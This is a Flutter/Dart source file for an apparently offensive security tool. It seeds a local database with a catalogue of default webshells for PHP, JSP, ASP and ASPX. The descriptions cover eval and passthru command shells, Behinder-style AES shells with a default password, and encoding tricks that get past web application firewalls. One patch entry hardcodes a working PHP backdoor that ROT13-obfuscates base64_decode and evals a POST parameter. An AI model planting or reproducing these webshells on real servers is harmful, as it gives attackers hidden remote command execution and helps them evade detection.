import 'package:flutter/services.dart';

import '../database/database_helper.dart';

/// 内置默认数据种子化服务
/// 版本号递增时自动补充新增的默认条目
class SeedService {
  static const _kMetaKey = 'seed_version';
  static const _kCurrentVersion = 7;

  // ── Payload 分类 ─────────────────────────────────────────────────────────
  // 命名规则：{语言}_{技术}_{传参方式}
  //
  // PHP
  //   php_eval_post.php       — eval() + POST cmd
  //   php_passthru_req.php    — passthru() + REQUEST cmd
  //   php_b64rot13_post.php   — base64+rot13 双重编码绕过
  // JSP
  //   jsp_runtime_get.jsp     — UTF-8 + ProcessBuilder + 字节解码中文；Matrix 用 echo|base64 -d|bash
  //   jsp_classloader_b64.jsp — ClassLoader 动态加载字节码（冰蝎风格）
  // ASP
  //   asp_wscript_get.asp     — WScript.Shell + GET cmd

  static const _defaultPayloads = [
    // ── PHP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/php_eval_post.php',
      name: 'php_eval_post.php',
      type: 'php',
      description: 'PHP eval() webshell，POST 参数 cmd，最基础的一句话木马',
      tags: 'php,eval,post,classic',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/php_passthru_req.php',
      name: 'php_passthru_req.php',
      type: 'php',
      description: 'PHP passthru() 命令执行，GET/POST 参数 cmd，回显直接输出',
      tags: 'php,passthru,request,cmd',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/php_b64rot13_post.php',
      name: 'php_b64rot13_post.php',
      type: 'php',
      description: 'ROT13 + Base64 双重编码绕过 WAF，POST 参数 mAtrix_911',
      tags: 'php,bypass,base64,rot13,waf',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/php_behinder.php',
      name: 'php_behinder.php',
      type: 'php',
      description: 'PHP 冰蝎 3.0（Behinder），AES 加密，func|params 格式，默认密码 mAtrix_911',
      tags: 'php,behinder,aes,encrypt,冰蝎',
      sinceVersion: 6,
    ),
    // ── JSP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_runtime_get.jsp',
      name: 'jsp_runtime_get.jsp',
      type: 'jsp',
      description:
          'JSP bash -c + mAtrix_911；UTF-8 请求/响应、子进程输出 UTF-8/GB18030/GBK、合并 stderr；Matrix 用 base64 管道传脚本',
      tags: 'jsp,runtime,exec,post,utf8',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_classloader_b64.jsp',
      name: 'jsp_classloader_b64.jsp',
      type: 'jsp',
      description: 'JSP ClassLoader 动态加载字节码（冰蝎风格），GET 参数 cmd 传 Base64 类文件',
      tags: 'jsp,classloader,bytecode,base64,behinder',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_behinder.jsp',
      name: 'jsp_behinder.jsp',
      type: 'jsp',
      description:
          'JSP 冰蝎 3.0（Behinder），AES 加密，payload 只读 body 第一行，agent 读第二行取参',
      tags: 'jsp,behinder,aes,encrypt,冰蝎',
      sinceVersion: 5,
    ),
    // ── ASP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/asp_wscript_get.asp',
      name: 'asp_wscript_get.asp',
      type: 'asp',
      description: 'ASP WScript.Shell 命令执行，GET 参数 cmd，cmd.exe /c',
      tags: 'asp,wscript,shell,get,cmd',
    ),
    // ── ASPX ─────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/aspx_cmd_post.aspx',
      name: 'aspx_cmd_post.aspx',
      type: 'aspx',
      description: 'ASPX .NET Process 命令执行，GET/POST 参数 cmd，纯文本输出，支持 PowerShell',
      tags: 'aspx,dotnet,process,cmd,powershell,windows',
      sinceVersion: 2,
    ),
  ];

  /// 需要更新内容的已有默认 payload（修复 bug 或改进实现）
  /// content 直接硬编码，不依赖 rootBundle 缓存，确保 patch 内容正确
  static const _patchPayloads = [
    // ── 名称统一（旧版使用简短名，新版与 asset 文件名对齐）──────────────────
    _PayloadPatch(names: ['php_simple.php'], newName: 'php_eval_post.php'),
    _PayloadPatch(names: ['php_cmd.php'], newName: 'php_passthru_req.php'),
    _PayloadPatch(names: ['jsp_simple.jsp'], newName: 'jsp_runtime_get.jsp'),
    _PayloadPatch(names: ['asp_simple.asp'], newName: 'asp_wscript_get.asp'),
    // ── 内容修复 + 重命名 ────────────────────────────────────────────────
    // php_b64rot13：eval 不能作变量函数调用，改为 ROT13 混淆 base64_decode
    _PayloadPatch(
      names: ['php_bypass.php', 'php_b64rot13_post.php'],
      newName: 'php_b64rot13_post.php',
      content:
          '<?php\n'
          r"$f = str_rot13('onfr64_qrpbqr');"
          '\n'
          r"$q = $f($_POST['mAtrix_911']);"
          '\n'
          '@eval(\$q);\n'
          '?>\n',
    ),
  ];

  /// 应用启动时调用，幂等；storedVersion < currentVersion 时补充新版本的条目
  static Future<void> seed(DatabaseHelper db) async {
    // Patch 检查每次启动都运行（与版本号无关），内容不一致时直接覆盖
    await _applyPatches(db);

    final stored = await db.getMetaValue(_kMetaKey);
    final storedVersion = int.tryParse(stored ?? '0') ?? 0;
    if (storedVersion >= _kCurrentVersion) return;

    var allSeeded = true;
    final existing = await db.getAllPayloads();
    final existingNames = existing.map((e) => e.name).toSet();

    for (final def in _defaultPayloads) {
      // 只种子化本次升级新增的条目
      if (def.sinceVersion <= storedVersion) continue;
      if (existingNames.contains(def.name)) continue;
      try {
        final content = await _loadPayloadContent(def.asset);
        await db.createPayload(
          name: def.name,
          type: def.type,
          content: content,
          isDefault: true,
          description: def.description,
          tags: def.tags,
        );
        existingNames.add(def.name);
      } catch (_) {
        allSeeded = false;
        // asset 缺失时跳过，不中断启动
      }
    }

    if (allSeeded) {
      await db.setMetaValue(_kMetaKey, '$_kCurrentVersion');
    }
  }

  /// 每次启动检查内置 payload 名称/内容是否与预期一致，不一致则原地修复（幂等）
  static Future<void> _applyPatches(DatabaseHelper db) async {
    var existingPayloads = await db.getAllPayloads();

    // 1) 应用显式 Patch（重命名 / 内容修复）
    for (final patch in _patchPayloads) {
      for (final p in existingPayloads) {
        if (!patch.names.contains(p.name)) continue;
        final needsRename = patch.newName != null && p.name != patch.newName;
        final needsContent =
            patch.content != null && p.content.trim() != patch.content!.trim();
        if (!needsRename && !needsContent) continue; // 已是正确状态
        try {
          await db.updatePayload(
            p.copyWith(
              name: needsRename ? patch.newName : null,
              content: needsContent ? patch.content : null,
              updatedAt: DateTime.now(),
            ),
          );
        } catch (_) {}
      }
    }

    existingPayloads = await db.getAllPayloads();

    // 2) 统一修复所有内置默认 payload 的内容编码
    //   （早期版本用 String.fromCharCodes 读取 asset，中文注释会乱码）
    final expectedContentByName = <String, String>{};
    for (final def in _defaultPayloads) {
      try {
        expectedContentByName[def.name] = await _loadPayloadContent(def.asset);
      } catch (_) {
        // 忽略缺失的 asset
      }
    }

    for (final p in existingPayloads) {
      final expected = expectedContentByName[p.name];
      if (expected == null) continue;
      if (!p.isDefault) continue;
      if (p.content.trim() == expected.trim()) continue;
      try {
        await db.updatePayload(
          p.copyWith(content: expected, updatedAt: DateTime.now()),
        );
      } catch (_) {}
    }
  }

  static Future<String> _loadPayloadContent(String asset) async {
    return rootBundle.loadString(asset);
  }
}

class _PayloadDef {
  final String asset;
  final String name;
  final String type;
  final String description;
  final String tags;

  /// 该条目从哪个 seed version 开始引入（用于增量种子化）
  final int sinceVersion;

  const _PayloadDef({
    required this.asset,
    required this.name,
    required this.type,
    required this.description,
    required this.tags,
    this.sinceVersion = 1,
  });
}

class _PayloadPatch {
  /// 匹配的 payload 名称列表（兼容不同版本的命名）
  final List<String> names;

  /// 统一后的正确名称（为 null 时不重命名）
  final String? newName;

  /// 期望的正确内容（为 null 时不更新内容）
  final String? content;

  const _PayloadPatch({required this.names, this.newName, this.content});
}
